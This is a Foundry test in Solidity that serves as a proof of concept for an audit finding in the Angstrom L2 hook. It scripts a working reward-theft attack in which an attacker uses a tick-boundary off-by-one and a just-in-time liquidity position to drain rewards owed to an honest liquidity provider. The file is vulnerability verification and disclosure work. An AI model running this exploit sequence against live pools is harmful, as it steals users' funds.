// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Entitlement and backing proof of vulnerability for finding 63008
// (Cyfrin, Sorella L2 Angstrom): "All rewards can be stolen due to incorrect
// active liquidity calculations when the current tick is an exact multiple of
// the tick spacing at the upper end of a liquidity range" (TickIterator
// off-by-one).
//
// This is the report's Proof of Concept #3 with three separate accounts (an
// honest LP, a trader, an attacker), measured the same way as the pilot loss
// test. The difference here: the four facts of the violation are checked with
// assertions, not only printed. All measurements are logged first, then the
// assertions run at the very end, so that on a fixed build the logs still show
// the honest LP claiming and removing before the first assertion fails.
//
// The four asserted facts (item 1 of the evidence package):
//   1. The honest LP has a positive reward entitlement before the attack.
//   2. After the attack the hook's ether backing (its ether claims minus
//      protocol revenue) is less than what the honest LP is owed.
//   3. The honest LP cannot obtain its entitlement: it receives less than it is
//      owed (on the vulnerable code its claim and its removal both revert).
//   4. The attacker collects more reward than its own swap tax would entitle it
//      to.
//
// On the vulnerable snapshot 386baff both test functions PASS (the violation
// holds). On a build where the bug is fixed the measurements still print but the
// first violation assertion fails, so the test FAILS (the violation is absent)
// and the logs show the honest LP claiming and removing in full.
//
// The swap tax is paid in ether (currency0), so every reward amount is in wei.
// Runs only offline, against local audited code, with mock tokens.

import {AngstromL2Test} from "./AngstromL2.t.sol";
import {RouterActor} from "./_mocks/RouterActor.sol";
import {UniV4Inspector} from "./_mocks/UniV4Inspector.sol";
import {IUniV4} from "../src/interfaces/IUniV4.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {console} from "forge-std/console.sol";

contract Evidence63008_Entitlement is AngstromL2Test {
    using TickMath for int24;
    using PoolIdLibrary for PoolKey;
    using IUniV4 for UniV4Inspector;

    // Scenario parameters (set per test).
    uint128 initLiquidity;
    uint256 buildLoops;
    uint256 buildPriorityFee;
    uint256 attackerPriorityFee;
    int24 tickSpacing;
    int24 initT0;
    int24 initT1;
    int24 startTick;
    int24 attackUpper; // boundary tick, a multiple of tickSpacing
    int24 attackLower; // attackUpper - tickSpacing

    // Shared run state (kept out of locals so the build does not run out of stack).
    RouterActor honestLp;
    RouterActor trader;
    RouterActor attacker;
    PoolKey key;
    uint256 honestPendingBefore;
    uint256 attackLiquidity;
    uint256 swapTax;
    uint256 attackRewards;
    uint256 honestPendingAfter;
    uint256 etherBackingLpRewards;
    uint256 rewardsClaimed;
    bool claimOk;
    bool removeOk;

    function _hookEther() internal view returns (uint256) {
        return manager.balanceOf(address(angstrom), 0);
    }

    // The main scenario: honest LP on [0, 50), start tick 17, boundary tick 20.
    function test_entitlement_backing_stealRewards() public {
        initLiquidity = 1e22;
        buildLoops = 5;
        buildPriorityFee = 1000 gwei;
        attackerPriorityFee = 5 gwei;
        tickSpacing = 10;
        initT0 = 0;
        initT1 = 50;
        startTick = 17;
        attackUpper = 20;
        attackLower = 10;
        _build();
        _attack();
        _checkAndAssert();
    }

    // The variant: a different boundary tick and different amounts. Honest LP on
    // [0, 50), start tick 23, boundary tick 30, attacker position [20, 30).
    function test_entitlement_backing_variant_boundary30() public {
        initLiquidity = 1e22;
        buildLoops = 5;
        buildPriorityFee = 1000 gwei;
        attackerPriorityFee = 5 gwei;
        tickSpacing = 10;
        initT0 = 0;
        initT1 = 50;
        startTick = 23;
        attackUpper = 30;
        attackLower = 20;
        _build();
        _attack();
        _checkAndAssert();
    }

    function _build() internal {
        honestLp = router; // funded in setUp
        trader = new RouterActor(manager);
        attacker = new RouterActor(manager);
        vm.deal(address(trader), 1000 ether);
        token.mint(address(trader), 1_000_000_000e18);
        vm.deal(address(attacker), 100 ether);
        token.mint(address(attacker), 1_000_000_000e18);

        key = initializePool(address(token), tickSpacing, startTick);

        honestLp.modifyLiquidity(key, initT0, initT1, int256(uint256(initLiquidity)), 0);

        setPriorityFee(buildPriorityFee);
        for (uint256 i = 0; i < buildLoops; i++) {
            bumpBlock();
            trader.swap(key, true, -10_000e18, int24(initT0 + 1).getSqrtPriceAtTick());
            bumpBlock();
            trader.swap(key, false, -10_000e18, startTick.getSqrtPriceAtTick());
        }

        honestPendingBefore =
            angstrom.getPendingPositionRewards(key, address(honestLp), initT0, initT1, 0);

        console.log("=== BEFORE ATTACK ===");
        console.log("honest LP pending rewards (wei):       ", honestPendingBefore);
        console.log("hook ether claims (wei):               ", _hookEther());
        console.log("hook protocol revenue (wei):           ", angstrom.unclaimedProtocolRevenueInEther());
    }

    function _attack() internal {
        // Step 1: move the price up to the boundary tick with no priority fee.
        setPriorityFee(0);
        bumpBlock();
        attacker.swap(key, false, -10_000e18, attackUpper.getSqrtPriceAtTick());

        // Step 2: size the just-in-time position so its reward share equals the
        // honest rewards, then add it just below the boundary.
        swapTax = angstrom.getSwapTaxAmount(attackerPriorityFee);
        uint128 ratio = uint128(honestPendingBefore) * 10_000 / uint128(swapTax);
        attackLiquidity = uint256(initLiquidity) * ratio / 10_000;

        bumpBlock();
        setPriorityFee(attackerPriorityFee);
        attacker.modifyLiquidity(key, attackLower, attackUpper, int256(attackLiquidity), 0);
        // Step 3: top-of-block swap back down, to just below the boundary.
        attacker.swap(key, true, -10e18, (attackUpper - 1).getSqrtPriceAtTick());

        attackRewards =
            angstrom.getPendingPositionRewards(key, address(attacker), attackLower, attackUpper, 0);
        uint256 hookEtherBeforeExit = _hookEther();

        // Step 4: remove the position, collecting its rewards.
        attacker.modifyLiquidity(key, attackLower, attackUpper, -int256(attackLiquidity), 0);

        console.log("=== ATTACK ===");
        console.log("attack liquidity:                      ", attackLiquidity);
        console.log("attacker own swap tax (wei):           ", swapTax);
        console.log("attacker JIT tax on add (wei):         ", angstrom.getJitTaxAmount(attackerPriorityFee));
        console.log("attacker pending rewards (wei):        ", attackRewards);
        console.log("hook ether paid out to attacker (wei): ", hookEtherBeforeExit - _hookEther());
    }

    function _checkAndAssert() internal {
        honestPendingAfter =
            angstrom.getPendingPositionRewards(key, address(honestLp), initT0, initT1, 0);
        etherBackingLpRewards = _hookEther() - angstrom.unclaimedProtocolRevenueInEther();
        uint256 unbacked = honestPendingAfter > etherBackingLpRewards
            ? honestPendingAfter - etherBackingLpRewards
            : 0;

        console.log("=== AFTER ATTACK ===");
        console.log("honest LP pending rewards (wei):       ", honestPendingAfter);
        console.log("hook ether claims (wei):               ", _hookEther());
        console.log("hook ether backing LP rewards (wei):   ", etherBackingLpRewards);
        console.log("honest LP rewards with no ether (wei): ", unbacked);

        // Honest LP tries to collect rewards only (liquidity delta 0), later block.
        bumpBlock();
        setPriorityFee(0);
        uint256 lpEth0 = address(honestLp).balance;
        try honestLp.modifyLiquidity(key, initT0, initT1, 0, 0) {
            claimOk = true;
        } catch {}
        rewardsClaimed = address(honestLp).balance - lpEth0;
        console.log("honest LP reward claim succeeded:      ", claimOk);
        console.log("honest LP rewards received (wei):      ", rewardsClaimed);

        // Honest LP tries to remove all its liquidity.
        uint256 lpTok0 = token.balanceOf(address(honestLp));
        lpEth0 = address(honestLp).balance;
        try honestLp.modifyLiquidity(key, initT0, initT1, -int256(uint256(initLiquidity)), 0) {
            removeOk = true;
        } catch {}
        console.log("honest LP full removal succeeded:      ", removeOk);
        console.log("ether returned on removal (wei):       ", address(honestLp).balance - lpEth0);
        console.log("token returned on removal (token wei): ", token.balanceOf(address(honestLp)) - lpTok0);

        // ---- Violation assertions (item 1). All measurements above are logged
        //      first, so a fixed build still prints them before this point. ----

        // (1) The honest LP had a real entitlement before the attack.
        assertGt(honestPendingBefore, 0, "honest LP had no reward entitlement");

        // (4) The attacker collected more than its own swap tax would entitle it to.
        assertGt(attackRewards, swapTax, "attacker reward <= its own swap tax (no theft)");

        // (2) The hook's ether backing is less than what the honest LP is owed.
        assertLt(etherBackingLpRewards, honestPendingAfter, "hook backing covers honest LP (no shortfall)");

        // (3) The honest LP cannot obtain its entitlement: it receives less than owed.
        assertLt(rewardsClaimed, honestPendingBefore, "honest LP received its full rewards (no loss)");
    }
}
